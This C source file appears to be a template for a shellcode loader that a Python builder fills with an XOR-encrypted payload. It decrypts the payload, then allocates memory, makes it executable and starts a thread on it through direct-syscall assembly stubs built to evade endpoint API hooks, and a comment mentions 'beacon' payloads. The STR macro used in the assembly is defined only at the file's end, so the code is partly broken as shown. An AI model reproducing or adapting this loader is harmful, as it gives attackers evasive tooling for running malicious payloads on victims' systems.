#include <windows.h>
#include <winternl.h> // For NTSTATUS and some structures, though we define our own syscalls
#include <stdio.h>    // For any debug printf, can be removed

// Define NTSTATUS if not fully available through included headers for some MinGW setups
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Simple XOR decryption stub
void XOR(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

// Shellcode and key are injected by the Python script
unsigned char shellcode[] = { {{ shellcode_hex }} };
char xor_key = {{ xor_key }};


// Definitions for system call numbers.
// WARNING: These syscall numbers are specific to Windows versions and architectures.
// The values below are EXAMPLES for a specific version of Windows 10 x64 (e.g., 20H2/19042).
// For robust solutions, syscall numbers should be dynamically resolved.
// This template uses hardcoded examples for demonstration.
#define SYSCALL_NTALLOCATEVIRTUALMEMORY 0x18
#define SYSCALL_NTPROTECTVIRTUALMEMORY  0x50
#define SYSCALL_NTCREATETHREADEX      0xC1
// NtWriteVirtualMemory is often less critical to syscall directly if NtProtectVirtualMemory is used,
// as WriteProcessMemory (which calls NtWriteVirtualMemory) might be hooked but the protection change is key.
// However, for completeness, one might add it. For this template, we'll use standard WriteProcessMemory after allocation.

// External C function declarations for our assembly syscall stubs
extern "C" NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

extern "C" NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

extern "C" NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList);

// GCC Inline Assembly for Syscalls (x64)
// The `syscall` instruction uses arguments in RCX, RDX, R8, R9 for the first four.
// R10 must contain the value of RCX for the syscall instruction.
// RAX contains the syscall number.
// The syscall instruction clobbers RCX and R11.

__asm__(
".global SysNtAllocateVirtualMemory\n"
"SysNtAllocateVirtualMemory:\n"
    "movq %rcx, %r10\n"          // Move 1st param (ProcessHandle) from RCX to R10
    "movl $" STR(SYSCALL_NTALLOCATEVIRTUALMEMORY) ", %eax\n" // Syscall number for NtAllocateVirtualMemory
    "syscall\n"
    "ret\n"
);

__asm__(
".global SysNtProtectVirtualMemory\n"
"SysNtProtectVirtualMemory:\n"
    "movq %rcx, %r10\n"          // Move 1st param (ProcessHandle) from RCX to R10
    "movl $" STR(SYSCALL_NTPROTECTVIRTUALMEMORY) ", %eax\n" // Syscall number for NtProtectVirtualMemory
    "syscall\n"
    "ret\n"
);

__asm__(
".global SysNtCreateThreadEx\n"
"SysNtCreateThreadEx:\n"
    "movq %rcx, %r10\n"          // Move 1st param (ThreadHandle) from RCX to R10
    "movl $" STR(SYSCALL_NTCREATETHREADEX) ", %eax\n" // Syscall number for NtCreateThreadEx
    "syscall\n"
    "ret\n"
);


int main(void) {
    NTSTATUS status;
    PVOID allocated_address = NULL;
    SIZE_T shellcode_size = sizeof(shellcode);
    HANDLE hThread = NULL;
    ULONG old_protect;

    // 1. Decrypt the shellcode
    XOR((char *)shellcode, shellcode_size, xor_key);

    // 2. Allocate memory for the shellcode using direct syscall
    // For current process, ProcessHandle is -1 (NtCurrentProcess())
    status = SysNtAllocateVirtualMemory(
        (HANDLE)-1,          // ProcessHandle (NtCurrentProcess())
        &allocated_address,  // BaseAddress
        0,                   // ZeroBits
        &shellcode_size,     // RegionSize
        MEM_COMMIT | MEM_RESERVE, // AllocationType
        PAGE_READWRITE       // Protect (initially RW)
    );

    if (status != STATUS_SUCCESS || allocated_address == NULL) {
        // Allocation failed
        return 1;
    }

    // 3. Copy shellcode to the allocated memory
    // Using standard WriteProcessMemory for simplicity here, as the critical part is often allocation/protection/thread creation.
    // A full direct syscall version would also use SysNtWriteVirtualMemory.
    if (!WriteProcessMemory((HANDLE)-1, allocated_address, shellcode, shellcode_size, NULL)) {
        // Failed to write memory
        // Consider cleanup: SysNtFreeVirtualMemory if implemented
        return 1;
    }

    // 4. Change memory protection to RX using direct syscall
    status = SysNtProtectVirtualMemory(
        (HANDLE)-1,          // ProcessHandle
        &allocated_address,  // BaseAddress
        &shellcode_size,     // RegionSize
        PAGE_EXECUTE_READ,   // NewProtect
        &old_protect         // OldProtect (output)
    );

    if (status != STATUS_SUCCESS) {
        // Protection change failed
        // Consider cleanup
        return 1;
    }

    // 5. Create a new thread to execute the shellcode using direct syscall
    // OBJECT_ATTRIBUTES can be NULL for simple cases.
    status = SysNtCreateThreadEx(
        &hThread,            // ThreadHandle (output)
        THREAD_ALL_ACCESS,   // DesiredAccess
        NULL,                // ObjectAttributes
        (HANDLE)-1,          // ProcessHandle (NtCurrentProcess())
        allocated_address,   // StartRoutine (pointer to shellcode)
        NULL,                // Argument
        0,                   // CreateFlags (0 for run immediately)
        0,                   // ZeroBits
        0,                   // StackSize (0 for default)
        0,                   // MaximumStackSize (0 for default)
        NULL                 // AttributeList
    );

    if (status != STATUS_SUCCESS || hThread == NULL) {
        // Thread creation failed
        // Consider cleanup
        return 1;
    }

    // Optional: Wait for the thread to finish.
    // For shellcode, typically we don't wait if it's a beacon.
    // WaitForSingleObject(hThread, INFINITE);
    
    // Clean up thread handle if necessary (though shellcode might exit process)
    // CloseHandle(hThread);

    return 0; // Success, or shellcode has taken over
}

// Helper macro for stringifying preprocessor definitions, used in asm for syscall numbers
#define STR_IMPL(x) #x
#define STR(x) STR_IMPL(x)